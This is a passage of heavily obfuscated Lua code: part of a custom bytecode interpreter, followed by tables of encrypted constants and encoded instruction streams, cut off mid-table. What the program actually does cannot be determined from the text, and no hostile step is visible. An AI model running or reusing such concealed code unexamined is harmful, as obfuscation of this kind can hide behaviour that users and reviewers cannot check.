_I00Ij[67]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
local parts={}
for i=1,n do parts[n-i+1]=tostring(_1IIu()) end
_IOlt(table.concat(parts)) end
_I00Ij[36]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
for _=1,n do _IOlt(nil) end end
_I00Ij[26]=function() ___Il0i=___Il0i+1
_11lIlh[___Il0i]=_11Ila end
_I00Ij[4]=function() local nr=_11l07[_l0Od]
_l0Od=_l0Od+1
local base=_11lIlh[___Il0i]
___Il0i=___Il0i-1
local f=_l_009[base+1]
local na=_11Ila-base-1
local args={}
for i=1,na do args[i]=_l_009[base+1+i] end
_11Ila=base
if type(f)~="function" then local mm=_OI_lw(f,"__call")
if mm then table.insert(args,1,f)
na=na+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if na==0 then r=table.pack(f()) else r=table.pack(f(table.unpack(args,1,na))) end
local rn=nr<0 and r.n or nr
for i=1,rn do _IOlt(r[i]) end end
_I00Ij[28]=function() local b,a=_1IIu(),_1IIu()
_IOlt(_1II01x(a,b,function(x,y) return math.floor(x/y) end,"__idiv")) end
_I00Ij[30]=function() local slot=_11l07[_l0Od]
_l0Od=_l0Od+1
local box=_11lIOc[slot]
if box then _l010b[slot]=box[1]
_11lIOc[slot]=nil end end
_I00Ij[39]=function() local startIdx=_11l07[_l0Od]
_l0Od=_l0Od+1
local base=_11lIlh[___Il0i]
___Il0i=___Il0i-1
local tbl=_l_009[base]
local idx=startIdx
for i=base+1,_11Ila do tbl[idx]=_l_009[i]
idx=idx+1 end
_11Ila=base
_l_009[_11Ila]=tbl end
_I00Ij[65]=function() local a=_l_009[_11Ila]
_l_009[_11Ila]=_l_009[_11Ila-1]
_l_009[_11Ila-1]=a end
_I00Ij[40]=function() local nameIdx=_11l07[_l0Od]
_l0Od=_l0Od+1
local methodName=__O_1lz(nameIdx+1)
local obj=_1IIu()
local method=obj[methodName]
_IOlt(obj)
_IOlt(method)
local b,a=_1IIu(),_1IIu()
_IOlt(b)
_IOlt(a) end
_I00Ij[2]=function() local nVars=_11l07[_l0Od]
_l0Od=_l0Od+1
local target=_11l07[_l0Od]
_l0Od=_l0Od+1
local iter=_l_009[_11Ila-2]
local state=_l_009[_11Ila-1]
local ctl=_l_009[_11Ila]
local r={iter(state,ctl)}
for i=1,nVars do _IOlt(r[i]) end
if r[1]~=nil then _l_009[_11Ila-nVars]= r[1] else _l0Od=target+1 end end
_I00Ij[1]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
local args={}
for i=1,n do args[n-i+1]=_1IIu() end
local f=_1IIu()
local results
if n==0 then results=table.pack(pcall(f)) else results=table.pack(pcall(f,table.unpack(args,1,n))) end
local ok=results[1]
_IOlt(ok)
if ok then for i=2,results.n do _IOlt(results[i]) end else _IOlt(results[2]) end end
_I00Ij[11]=function() local n=_11l07[_l0Od]
_l0Od=_l0Od+1
local args={}
for i=1,n do args[n-i+1]=_1IIu() end
local handler=_1IIu()
local f=_1IIu()
local results
if n==0 then results=table.pack(xpcall(f,handler)) else results=table.pack(xpcall(f,handler,table.unpack(args,1,n))) end
local ok=results[1]
_IOlt(ok)
for i=2,results.n do _IOlt(results[i]) end end
_I00Ij[38]=function() local iS=_11l07[_l0Od]
_l0Od=_l0Od+1
local sS=_11l07[_l0Od]
_l0Od=_l0Od+1
local vS=_11l07[_l0Od]
_l0Od=_l0Od+1
local it=_O1I1lq(iS)
if type(it)=="table" then local ok2,mt=pcall(getmetatable,it)
if ok2 and type(mt)=="table" and mt.__iter then local fn=mt.__iter(it)
_OIOI1r(iS,fn) elseif ok2 and type(mt)=="table" and mt.__call then else _OIOI1r(iS,next)
_OIOI1r(sS,it)
_OIOI1r(vS,nil) end end end
_I00Ij[60]=function() local a=_11l07[_l0Od]
_l0Od=_l0Od+1
local b=_11l07[_l0Od]
_l0Od=_l0Od+1
local c=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(c,_O1I1lq(a)+_O1I1lq(b)) end
_I00Ij[29]=function() local a=_11l07[_l0Od]
_l0Od=_l0Od+1
local b=_11l07[_l0Od]
_l0Od=_l0Od+1
local c=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(c,_O1I1lq(a)-_O1I1lq(b)) end
_I00Ij[14]=function() local a=_11l07[_l0Od]
_l0Od=_l0Od+1
local b=_11l07[_l0Od]
_l0Od=_l0Od+1
local c=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(c,_O1I1lq(a)*_O1I1lq(b)) end
_I00Ij[42]=function() local k=_11l07[_l0Od]
_l0Od=_l0Od+1
local s=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(s,__O_1lz(k+1)) end
_I00Ij[56]=function() local a=_11l07[_l0Od]
_l0Od=_l0Od+1
local b=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(b,_O1I1lq(a)) end
_I00Ij[50]=function() local a=_11l07[_l0Od]
_l0Od=_l0Od+1
local k=_11l07[_l0Od]
_l0Od=_l0Od+1
local c=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(c,_O1I1lq(a)+__O_1lz(k+1)) end
_I00Ij[37]=function() local a=_11l07[_l0Od]
_l0Od=_l0Od+1
local b=_11l07[_l0Od]
_l0Od=_l0Od+1
local c=_11l07[_l0Od]
_l0Od=_l0Od+1
_OIOI1r(c,_O1I1lq(a).._O1I1lq(b)) end
_I00Ij[48]=function() local _=_11Ila end
_I00Ij[58]=function() local _a=_11l07[_l0Od]
_l0Od=_l0Od+1
local _=_l_009[_a] or 0 end
_I00Ij[19]=function() local _a=_11l07[_l0Od]
_l0Od=_l0Od+1
local _b=_11l07[_l0Od]
_l0Od=_l0Od+1
local _=bit32.bxor(_a,_b) end
_I00Ij[23]=function() local _a=_11l07[_l0Od]
_l0Od=_l0Od+1
if _1ll10==0 then _IOlt(_O1I1lq(_a)) else _IOlt(__O_1lz(_a+1)) end end
while true do
if _0OI0k or _l0Od>#_11l07 then break end
local op=_11l07[_l0Od]
_l0Od=_l0Od+1
local h=_I00Ij[op]
if h then h() end
end
if _0OI0k then
if _I1__p then return table.unpack(_I1__p,1,_I1__p.n or #_I1__p) end
if _00010l then
if _O0Io==0 then return end
return table.unpack(_l_009,_O0_Om+1,_10lOn)
end
return
end
return nil
end
local _l0_24={{124,253,112,251},{91,248,106,204,69,211,84,202,71,192},{77,242,126,217,68,208,80},{86,235,84,209,113,198,86,211,79,196,77},{75,197,77,199,83,203,87,210,116,205,91,220,66,207,72},{117,210,71,209,109,203,86,210,92,250,79,217,90,196,77,202},{115,215,77,247,64,212,81,193,74,207},{113,215,69,215,82,194,90,238,95,194},{111,203,66,245,66,218,95,195,72,201},{104,202,69,198,68,249,70,202,85,200,92},{107,199,74,205},{100,235,103,241,117,237,126,248,103,251,0,128,3,130,4},{79,220,93,218,88,150,2,129,92,213,82,192,86,192,24,198,69,215,93,207,88,200,84,209,81,237,39,242,33,253,107,179,55,230,59,171,34,160,58,175,54,254,48,162,35},{76,192,93,202,71,204,28,157,0},1.5,{94,202,95,198},{88,220,76,217,65},{24,156,29,155,4,128,4,131,4,128},12,144,{92,196,67,219,93,211},{86,222,64,222,85,193},{93,221,80,213,89,150,101,253,117,251,98,129,31,155,76,226,97,174,44,167,36,170,103,131,12,147,118,238,104,189,109,240,61,189,48,181,57,246,22,141,16,158,102,254,120,173,125,234,13,141,0,133,9,198,15,155,84,141,10,129,8,212,40,149,5,161,22,134,3,159,20,157,81,216,51,136,9,142,44,101,243,116,234,103,224,36,174,2,229,101,232,109,225,46,227,96,172,117,242,121,240,44,208,125,237,73,254,110,235,119,252,69,137,0,243,72,196,95,194,90,218,8,130,2,225,65,204,81,221,98,223,85,204,83,197,50,213,85,216,93,209,30,211,51,252,37,162,41,160,124,128,45,189,25,174,62,187,39,172,53,249,112,159,59,178,5,178,42,175,51,184,57,255,119,213,12,142,1,130,8,197,0,146,6,138,30,130,3,131,78,157,88,158,91,211,29,147,86,132,1,151,90,154,18,153,94,140,249,111,172,113,225,116,243,98,251,125,170,127,228,104,224,47,226,116,230,102,230,123,182,100,225,119,180,105,249,108,235,122,211,85,138,76,141,5,195,75,219,76,195,77,140,69,218,91,192,110,192,86,197,64,211,68,204,25,206,83,217,83,158,77,165,53,183,49,170,101,174,51,188,57,149,57,169,60,187,42,163,37,250,60,253,117,179,59,171,60,179,61,252,47,187,46,149,4,145,23,196,17,142,2,134,73,152,14,152,24,156,1,208,3,151,2,129,16,133,3,208,22,211,91,153,19,154,95,101,239,102,137,104,234,101,230,100,169,108,254,98,238,122,230,127,255,50,227,60,229,119,227,112,181,126,178,60,237,125,254,76,205,10,209,8,222,115,213,68,148,120,238,96,236,119,129,30,193,83,199,92,153,123,210,76,209,85,223,1,159,110,240,19,149,96,239,12,160,39,163,45,187,57,246,55,150,108,140,63,191,38,182,58,161,123,131,33,169,63,249,1,224,124,190,16,145,14,138,7,132,18,142,7,135,69,129,31,130,0,205,13,221,48,156,16,140,75,159,11,195,48,168,51,179,59,145,227,110,230,102,172,97,175,122,161,41,239,101,232,7,226,96,243,112,254,51,225,124,242,42,236,118,233,111,238,116,240,120,136,77,210,13,241,86,195,85,225,77,131,33,192,94,128,98,213,66,193,82,211,80,249,66,204,3,249,84,210,83,219,92,180,105,164,54,170,38,178,46,167,39,226,38,191,42,226,34,164,120,216,63,187,54,183,59,248,41,168,62,225,127,174,45,137,15,150,65,238,12,128,71,133,29,215,86,169,3,155,2,222,60,151,0,135,20,145,18,172,0,138,30,210,48,155,12,115,224,101,230,83,228,116,233,97,231,109,171,120,229,107,225,48,225,96,246,41,183,97,246,106,247,56,145,121,241,109,250,73,199,2,206,80,152,27,226,70,220,71,133,97,200,93,220,81,214,87,231,77,197,83,153,117,220,73,200,93,218,91,250,50,179,45,177,100,177,46,162,38,233,58,185,41,240,108,170,34,163,61,161,118,245,51,185,60,211,46,186,47,182,112,172,16,128,21,141,76,131,19,137,11,157,3,132,2,197,71,229,0,217,80,220,7,144,24,147,90,213,1,143,29,143,25,154,244,84,235,103,185,68,211,78,204,37,233,100,232,104,179,45,207,78,222,92,211,74,201,53,182,55,242,104,166,87,205,80,238,100,204,64,203,65,195,15,211,92,195,79,145,88,199,75,156,95,211,94,209,8,218,71,150,119,219,86,217,17,206,77,165,124,178,49,161,105,171,52,175,116,190,36,191,57,188,38,190,54,250,62,167,50,255,42,241,117,187,63,177,52,176,20,133,24,223,40,161,60,155,78,226,12,132,15,197,103,139,1,148,88,248,7,149,6,157,89,139,9,155,12,146,85,152,10,110,226,118,234,107,235,46,174,40,254,98,226,96,232,46,251,113,226,121,189,99,244,127,227,48,168,52,174,53,189,122,240,0,209,10,129,11,215,67,192,65,218,94,206,94,143,2,212,69,216,86,142,65,220,82,155,86,216,87,222,1,209,78,145,14,160,47,166,104,181,42,166,43,172,3,175,113,185,33,188,36,163,59,189,51,253,49,182,53,188,116,139,48,188,61,186,41,133,75,207,14,138,4,174,12,212,13,138,1,136,64,165,31,147,59,151,9,220,86,146,22,157,90,158,18,153,87,245,244,96,241,104,170,118,246,102,255,103,162,109,249,99,237,123,249,126,252,59,189,53,225,127,241,117,255,59,232,124,237,116,142,86,195,74,208,13,151,9,157,0,138,79,195,39,194,64,211,80,222,19,219,94,154,69,221,74,135,75,223,92,210,83,232,51,238,56,145,55,170,122,154,12,134,10,149,99,224,109,255,33,189,63,184,122,244,121,246,44,179,63,240,16,187,43,136,14,134,94,198,34,163,51,202,20,195,97,133,11,206,0,155,81,147,29,144,85,132,18,139,89,155,21,152,93,140,26,115,175,64,236,96,252,38,243,96,236,100,129,96,226,109,238,124,177,125,248,38,185,114,170,104,250,123,247,112,181,118,236,14,235,113,236,106,225,67,196,71,205,79,135,68,222,2,221,85,194,28,241,91,209,79,158,50,208,92,155,83,214,12,159,33,175,38,227,32,229,39,169,44,233,62,178,60,168,102,171,126,178,61,183,49,252,107,234,122,170,46,169,53,179,57,253,64,128,12,135,68,198,2,201,11,134,14,142,82,221,78,155,24,148,28,249,24,154,21,150,20,217,28,149,65,145,17,158,228,114,246,113,237,107,225,47,236,39,233,100,232,104,167,47,249,119,178,117,250,53,226,127,253,119,186,111,253,110,245,49,211,81,195,84,202,13,214,68,201,69,198,7,202,67,135,15,213,95,214,57,209,91,210,61,221,87,222,49,217,83,218,31,165,47,166,106,206,53,238,101,231,59,175,44,165,62,186,42,162,115,254,40,161,60,178,106,173,48,190,119,178,60,179,58,221,13,146,77,170,4,139,2,196,25,134,10,143,8,167,11,205,5,157,0,128,7,159,25,159,81,157,26,145,24,208,47,108,224,97,230,77,225,47,171,98,230,104,194,104,176,105,238,125,244,60,217,123,247,95,243,101,176,16},{126,220,87,212,90,231,84,216,67,222,78,252,76,205,41,183,39,167,2,183,41,170,28,172,38,174,60,162,60,187},{112,219,91,216,82,219,77},{123,219,98,210,84,220,74,212,78,201},{66,217,69,211,74,202,90,223,88},{117,194,74,203,95,213,72,254,95,210,37,179,35},{97,209,92,205,75,211,79,202,108,169,59,167},{96},{84,219,79,212},{89,215,93,208,78},1280,0.6,1.4,{125,208,44,174,48,240},{89,178,46,175,17,131,7},0,8,14,20,35,200,255,180,30,160,70,90,150,220,{7,161,35,165,51,189,55,176},{33,181,38},{3,178,32,182,49,187,17,162,49},{19,150,12,149,49,187,62,182},{0,182,39,176,34,152,54,138,42,186,43,179},{9,157,59,178,50,160,27,191,51,189,43,183,48,146},{17,187,35,186},{6,191,53,180,48,180,60},{31,176,54,182,40,190,27,168,55,150,14,146,7,151},{7,185,43,191,53,168},{15,184,51,175,26,178,44,156,8,136,14,135},{9,182,58,165,56,172,24,149,8},620,560,{26,175,63,178,5},{14,183,37,133},{11,155,9,140,80},{15,143,18,139,23,141,10,136},0.5,2,{32,130,7,142,1,149,7,156,4,143,47,130,2,128,2,194},{33,139,23,130,2,154,58,131,17,137,61,135,23,149,29},{37,134,18,142,30,140},{33,148,6,143,14,139,9,128,8},{37,139,1,153,25,175,9,158,13,138,30,149,19,157,0,134},6,1,36,{40,170,47,166,42,160,63,163,82,211,182,66,86,215},11,{42,130,0,155},{42,129,27,152,16,159,49,155,25,146},120,10,{37,191,62,188,53,177},60,15,65,22,96,{148,107,237},28,{53,150,15,136,25,191,11,139,244,110,236,50,199,105,239,100,227},32,{63,131,25,158,11,139,229},3,{40,146,17,147,243},4,{49,138,244,113,247,119},26,{230,109,237,108,246},{232,114,226,109,247,117},{214,102,252,113,196,114,252,125,229,101},{193,101,230,109,224,122,230,127,229,104,217,124,238,126,226,98,242,102,240,120,244,97},{208,96,254,115},{209,99,255,124,202,101,231,99,255,61},{210,98,240,125,217,98,246,104},{198,125,253,101,201,121,249,122,224,126,210,125,255,123,231},16,{223,99,248,101,239,98,234},{201,68,194,67,203,76,196,84,214,51,180,37},9,18,{222,109,253,127,253,126,250,122,242,80,229,121,244,127},{221,108,226,126,254,127,214,116,228,67,240,112,249,112,242,120,237,108},{220,115,227,125,255,120,215,119,229,81,244,123,252,121,222,113,243,79,211,17},{211,112,252,101,245,102,197,126,226,124},{196,91,223,125,230,98,219,121,224,117,238,104},{193,124,230,97,217,101,252,124,232},{223,117,236,121,226,108,214,104,255,121,239},{196,116,242,115,241,119,253},{192,82,254,117},{216,88,184,77,219,73,219,88,202},40,5,{},{206,126,228,105,201,109,193,81,210,70,192},{209,83,212,80,191,115,228,112,245,97,247},{204,72,210,83,128,117,237,3,233,96},{201,78,191,104,228,112,230,4,141,117,230,101,236,10,248,122,255,7},50,{212,105,226,105},80,{226,112,226,119,237},{232,118,233,117,245,100,233,123,239},{240,116,252,6,228,96,232,126},{226,119,227,98,242,108},7,{234,104,231,121,138,96,229,97,226},{228,103,249,115,139,102,226,108,230,116},{227,96,230,103,140,121,230,125,245,112,246,96},{236,114,238,111,248,122,234,16,254,124,147,96,244,100,240,125,237},{135,6,140,65,219,78,144,67,199,93,199,21,217,89,152,77,219,73,219,88,202,31,165,57,167,32,177,49,169,53},{232,67,201,75},{233,117,235,108,229,101,247},{221,65,220},{222,93,217,95,198,27,211,84,219,82,130,126,223,79,239,88,204,73,169,34,167,107,230,21,170,38,177,44,184,56,238,100,224,3,191,50,179,63,132,57,183,46,189,43,244,24,180,60,172,62,131,21,135,17,202,53,148,14,133,8,152,18,188,12,156,27,222,33,157,0,157,1,159,24,150,80},{220,64,212,87,215},{215,80,223,86,142,114,211,67,235,92,200,77,213,94,219,23,226,17,174,34,189,32,180,52,234,96,228,7,163,46,175,35,128,61,179,42,177,39,248,20,176,56,168,58,191,41,187,45,206,41,151,14,133,11,137,14,140,71,189,10,128,6,189,31,149,20,150,78,199,71},{223,93,208,88,220,70},{222,92,215,84,218,23,202,74,135,92,221,80,219,5,135,36,182,16,161,55,176,46,171,44,226,105,158,56,160,28,181,35,164,58,183,48,244,126,248,53,181,56,189,49,254,51,144,92,133,2,137,0,220,32,141,29,185,14,158,27,135,12,149,89,208,35,152,20,143,18,138,10,216,82,210,49,145,28,97,237,82,239,101,252,99,245,40,229,122,165,79,229,111,253,113,242,102,246,102,187,94,226,117,248,116,244,117,249,36,220,72,192,76,196,65,246,82,198,92,204,2,154,29,132,14,221,67,159,97,199,81,197,70,210,92,131,121,212,82,211,91,220,52,233,36,182,42,166,50,174,39,167,98,226,108,161,62,225,19,185,51,161,53,182,34,178,42,247,18,174,49,188,48,176,9,133,88,160,12,132,8,128,13,186,30,138,24,136,70,222,65,216,82,150,26,145,95},{218,90,211,92,194,85,201},{211,84,219,82,130,126,223,79,239,88,204,73,169,34,167,107,230,16,181,34,186,0,164,59,185,57,157,42,162,39,187,48,177,119,255,121,146,44,183,43,142,56,175,42,133,18,150,89,167,10,136,9,141,10,158,67,138,24,128,12,132,24,157,29,220,92,214,16,153,20,159,65,187,24,138,44,101,243,116,234,103,224,46,165,88,229,107,242,105,255,125,173,57,191,94,252,119,244,122,199,116,248,99,254,110,179,93,247,65,211,67,192,80,192,84,137,96,220,71,202,66,194,71,203,10,242,90,210,90,210,83,228,76,216,78,222,20,248,80,202,45,239,10,182,41,164,40,168,33,173,25,191,45,185,43,155,41,161,55,253,30,160,59,167,49,183,61,242,124,184,48,187,73},{210,89,211},{218,88,219,88,214,27,212,0,217,94,173,36,248,4,161,49,149,34,186,63,163,40,169,101,236,31,188,48,171,54,166,38,244,126,246,21,181,56,189,49,142,51,129,24,135,17,202,38,142,6,154,8,137,31,137,31,192,39,133,28,147,29,155,28,146,87,144,87,183,26,132,53,155,30,108,245,106,190,105,228,114,239,38,225,127,236,105,173,102,161,88,244,115,255,96,253,43,250,121,237,114,181,116,232,121,250},{199,84,216,67,222,78,206},{222,86,200,27,227,17,206,31,169,47,226,51,165,44,180,52,224,46,171,38,169,119,137,42,164,2,183,33,162,60,181,50,240,123,138,55,189,36,187,45,147,67,203,89,163,0,146,55,132,8,147,14,158,30,198,70,217,81,150,28,212,5,132,30,150,13,210,11,210,51,159,18,101,173,114,173,81,246,99,245,65,237,35,171,105,227,106},{202,89,201,85,205,74,204},{220,84,206,29,225,19,179,97,171,45,228,53,167,46,186,58,226,44,173,32,171,117,151,52,166,23,177,38,181,50,182,61,187,53,168,46,246,118,201,65,134,12,196,12,128,71,155,83,163,24,173,69,204,35,159,18,147,31,167,22,132,30,136,13,216,82,220,18,140,95,115,187,75,240,69,173,36,212,107,251,99,251,120,175,39,175,100,249,119,253,52,229,100,254,118,237,50,232,38,218,123,235,102,212,78,207,106,196,75,194,0,128,3,139,73,195,74,143,85,223,86},24,{250,84,210,83,132,40,176,38,167,49,175,40,166},{245,81,205,41,187,45,173,48,164,42},62,{252,8,128,22,227,5,150,102,147,9,155,13,142,24},{173,36,177,48,165,34,163,165,72,239},{146,7,141,0},66,{133,43,166,51,180,4,166,57,191},{134,23,137,6,140,10,139,24,152},{168,35,180,59,168,45,174,108,185,33,239,49,189,62,243,55,185,63,178,54,173,41,57,220,123},76,{148,13,155,28,142,30,237,7,129,22,158},38,{43,202,95},{152,14,138,31,139,28,152},{134,13,158,29,239,17,146,6,154,27,155,5},{135,4,141,4,240,16,158,31},{142,28,142,3,153,114,146,24,153},{133,6,156,29,242,18,152,25,246,3,144,11,159,26,152,14},{156,21,157,20},{131,1,151,22,144},{159,29,144,24,156,6},{155,29,146,117,156,2,149,9},{144,27,133,15,247,13,144,30},{155,0,130,7,141,13},{148,26,155},{147,5,138},{128,25,139,20},{155,21,136},{134,29},{133,4,158,25,129,19,175,38,164,45},{150,57,174,45,190,7,132,45,150,16},{143,4,141,11,165,44},{180,48,185,15},{172,58,140,0,155,89,196},{190,4,140,11,141,68,144,15,131,82,201},{148,14,145,23,150,12,136,0},{180,17,134,22,172,2},{171,13,148,16,146,37,141,14,139,5}}
local _0lI26={{K={1,2,{110,231,113},{108,250,81,212,71,208,80},15,225,{73,214,87,212,122,212,66,217,92,207,88,216},100,7,12,144,{64,203,93,209,95,216},3,9,{74,207,71,201,95,215},49,{120,207,95,199,95,196,102,211,65,209},{68,217,90,223},{95,193,65,217,95},{86,202,94,222},{98,213,69,218,92,208},{96,254,97,231},{97,221,64,192,116,197,78,214,90},{103,193,88},{113,219,81,207},{},{112,216,66,213},{126,195,76,201,121,212,82,201,91,209,52,149,59,179,33},{118,200,73,214,82,223,92,202,86,175,47,136,48,171,43},{107,205,91,207,73,206,125,208,36,164},200,{125,222,72,252,77,198,46,162}},C={6,5,6,5,16,6,4,3,59,15,28,17,4,28,7,59,15,28,17,4,28,7,6,6,30,15,44,28,7,6,6,30,51,5,62,4,-1,20,-1,41,448,6,1,6,1,26,6,0,3,59,15,61,17,4,28,3,15,64,28,3,51,5,62,4,-1,20,-1,41,448,6,2,6,13,19,6,4,3,59,15,81,17,4,28,6,15,100,28,6,51,5,62,4,-1,20,-1,41,448,6,12,6,12,26,6,15,3,59,15,127,17,4,28,14,59,15,127,17,4,28,14,6,6,30,15,143,28,14,6,6,30,51,5,62,4,-1,20,-1,41,448,6,9,6,4,48,6,8,3,59,15,166,17,4,28,11,59,15,166,17,4,28,11,6,6,30,15,182,28,11,6,6,30,51,5,62,4,-1,20,-1,41,448,6,13,6,13,26,6,10,3,59,15,201,17,4,28,21,59,15,201,17,4,28,21,6,6,30,15,217,28,21,6,6,30,51,5,62,4,-1,20,-1,41,448,6,5,6,5,16,6,4,3,59,15,240,17,4,28,20,59,15,240,17,4,28,20,6,6,30,15,256,28,20,6,6,30,51,5,62,4,-1,20,-1,41,448,6,1,6,1,26,6,0,3,59,15,283,17,4,28,23,59,15,283,17,4,28,23,6,6,30,15,299,28,23,6,6,30,51,5,62,4,-1,20,-1,41,448,6,2,6,13,19,6,4,3,59,15,322,17,4,28,22,59,15,322,17,4,28,22,6,6,30,15,338,28,22,6,6,30,51,5,62,4,-1,20,-1,41,448,6,12,6,12,26,6,15,3,59,15,361,17,4,51,5,6,17,30,6,16,3,15,416,39,5,59,6,19,30,68,51,5,6,18,30,51,5,6,29,30,59,37,15,386,17,4,6,28,28,31,6,30,30,6,25,30,44,69,0,52,4,10,59,6,29,51,4,13,59,6,24,6,27,13,20,4,41,448,39,5,59,6,26,30,68,51,5,6,18,30,44,69,6,52,7,10,59,6,29,51,7,13,59,6,24,6,27,13,20,4,20,5},P={},U={{1,1}},nParams=1},{K={{107,255,124,242,115},{73,239,114},{80,251,107,200,78,198},{78,208,115,245},{87,197,64,198,70,214,86},{99,206,76,215,65,203,82,138,124,208,90,206},{64,210,83,200,76,197,70,220,64,197,69,131,71,221,64,222},{96,204,64,220},{105,247,106,232,98,198,74,197,79,201},3,2,9},C={28,5,39,5,10,59,6,4,39,4,51,5,5,13,59,6,7,6,6,13,59,6,1,10,59,6,0,6,3,13,13,59,6,2,39,7,59,6,13,30,68,51,4,69,7,13,62,7,7,52,6,52,7,6,12,6,15,48,6,14,3,59,15,78,17,4,51,7,59,15,78,17,4,51,6,15,83,51,6,6,2,30,20,4,41,83,20,5},P={},U={{1,12},{1,9},{1,1}},nParams=2},{K={{107,255,124,242,115},{73,239,114},{80,251,107,200,78,198},{89,218,116},7,49,{99,205,71,221}},C={28,5,39,5,10,59,6,4,39,4,51,5,5,13,59,6,7,6,6,13,62,7,7,52,7,52,4,6,1,6,1,26,6,0,3,59,15,52,17,4,51,4,59,15,52,17,4,51,7,15,57,51,7,6,3,30,20,4,41,57,20,5},P={},U={{1,12},{1,9}},nParams=1},{K={{52,238,120,249,118,211,85,199,81},{105,244,122},{105,241,108,212,83,203,77,195},{75,236,69,211,107,199},{113,193,76,199},{110,192,79,198},{81,206,66,199,64,239,67},{69,194,73,192},{115,200,68,197,66,225,77},{78,202,68,238,76},{111,201,69,225,77}},C={39,5,6,5,10,59,6,4,28,7,39,4,6,6,30,69,4,13,59,6,1,39,4,6,0,30,13,59,6,3,28,7,28,2,6,13,30,69,4,13,59,6,12,28,2,6,15,30,13,69,7,17,4,20,5},P={},U={{1,13},{1,7}},nParams=0},{K={1,2,{105,255,108,203},{105,254,73,213}},C={6,5,6,5,16,6,4,3,59,15,19,17,4,28,7,6,6,30,39,5,69,4,15,37,39,4,69,5,17,4,41,5,20,5},P={},U={{1,11},{1,15}},nParams=0},{K={{111,243,110,234,109,201,79,197},{73,238,123,237,105,197},{83,255,114,197},{83,250,83,210,67,196,65,234,83,211},{92,207,79,204,70,199,81}},C={28,5,39,5,6,4,30,69,4,52,4,39,5,6,7,30,52,7,39,4,6,6,30,59,6,1,30,68,54,4,69,7,17,4,20,5},P={{K={{107,238,116,240,107},15,225,{91,241,85,204},{82,197,82,209,66,195,64,242,94,216,76},{109,196,81,208,69,194,67,240,73,219,68,194,66,202},{86,195,81,202},100,7,2,{104,195,84,219,72,205,78,233,95,220,64,194},{67,213,90,198,88},12,144,{100,207,88,223,76,201,74,249,95,212,92},{67,197,74,194},{95,205,94,197},{95,221,79,216,94}},C={6,5,52,7,6,4,6,4,26,6,7,3,59,15,25,17,4,51,4,28,6,6,1,30,6,0,30,3,15,33,6,3,52,7,41,97,6,2,6,13,19,6,12,3,59,15,57,17,4,51,4,28,6,6,1,30,6,15,30,3,15,65,6,14,52,7,41,97,6,9,6,9,26,6,8,3,59,15,89,17,4,51,4,28,6,6,1,30,6,11,30,3,15,97,6,10,52,7,41,97,28,21,6,20,30,54,4,69,4,17,4,20,5},P={{K={{52,240,114,249},{105,244,122},{115,255,114,197},{110,237,69},{114,211,70},{84,206,81,215,86,204,72,192},{64,198,78,205,75,237,66,209}},C={39,5,6,5,10,59,6,4,39,4,13,59,6,7,39,7,13,59,6,6,39,6,13,59,6,1,28,0,39,1,69,4,13,59,6,3,39,0,13,69,7,17,4,20,5},P={},U={{0,0},{0,1},{0,2},{1,2},{1,0},{0,3}},nParams=0}},U={{0,2},{1,1},{1,2},{0,3}},nParams=2}},U={{1,7},{1,6},{1,13},{1,10}},nParams=1},{K={3,2,9,{106,254,83,202},{104,193,72,214},{15,209,77,207,72,138},{85,205,80,208,87,207,73,207},{119,208,65,215,111,195},7,49,{85,197,70,196,69},{108,244,103,231,110,206,79,194,74,202},1,{92,208,90,206},{74,197,79,201},{89,223,94,196,64,200},0,15,225,{113,240,123,248,126,255,96,253,100,242,121,253,105,228,99},{95,209,88,192,64},{83,208,92,208,81,217},100,{109,236,97,251,122,248,121,253,101,228},{117,221,91,210,113,209,75,201,79,255,85,215,83,164},{100,217,87,206,93,203,125,206,85},12,144,{117,252,102,251,95,209,84,208},{124,220,73,207,78,210,71},{74,207,89},{101,228,112,242,121,224,31},{100,251},{99,226,124,251,31,141,13,132,2,139},8,{80,222,45,164},{79,178,36},{45,178,37},{45,173,34,160,54,178,53,161,39,173},{49,179,37,178,40},{55,165,39,170,34},{45,171,53,162,58,189}},C={6,5,6,4,48,6,7,3,59,15,19,17,4,28,6,6,1,30,39,5,69,4,15,624,39,4,6,0,28,3,39,7,6,2,30,69,4,5,69,4,52,5,6,13,6,13,26,6,12,3,59,15,60,17,4,51,5,15,584,28,15,39,6,6,14,30,39,6,51,5,62,6,7,52,7,52,4,6,9,6,9,16,6,4,3,59,15,135,17,4,51,4,59,15,102,17,4,51,7,59,15,113,17,4,28,8,51,7,6,11,30,69,4,6,10,3,59,15,135,17,4,51,7,6,11,30,46,6,21,36,15,590,6,20,6,20,26,6,23,3,59,15,156,17,4,51,7,6,11,30,6,22,3,15,222,28,17,39,1,62,4,6,52,0,52,1,52,6,35,6,1,0,27,3,27,2,51,6,51,1,51,0,62,7,7,52,2,52,3,51,3,52,0,51,3,12,0,15,211,28,15,28,6,6,16,30,51,2,69,7,17,4,41,169,10,40,1,41,588,6,19,6,13,19,6,4,3,59,15,245,17,4,51,7,6,11,30,6,18,3,15,378,28,17,39,1,62,4,6,52,15,52,12,52,13,35,13,12,15,27,14,27,9,51,13,51,12,51,15,62,7,7,52,9,52,14,51,14,52,15,51,14,12,0,15,296,28,15,28,6,6,16,30,51,9,69,7,17,4,41,262,10,40,1,39,7,59,6,29,30,68,6,28,69,7,52,8,6,31,6,31,26,6,30,3,59,15,329,17,4,51,8,15,382,51,8,59,6,29,30,68,6,25,69,7,52,11,6,5,6,4,48,6,7,3,59,15,367,17,4,51,11,15,380,51,11,59,6,24,30,68,69,4,17,4,41,380,41,382,41,624,41,588,6,13,6,13,26,6,12,3,59,15,410,17,4,51,7,6,11,30,59,6,27,30,68,6,9,6,13,69,6,6,26,3,15,532,6,9,6,9,16,6,4,3,59,15,447,17,4,39,0,59,15,447,17,4,28,37,6,36,30,15,522,31,28,15,39,6,6,14,30,39,6,51,7,6,11,30,59,6,27,30,68,6,39,62,7,-1,1,7,52,21,52,10,6,20,6,20,26,6,23,3,59,15,500,17,4,51,10,59,15,500,17,4,51,21,15,520,28,37,6,36,30,51,21,6,38,30,51,21,6,33,30,51,2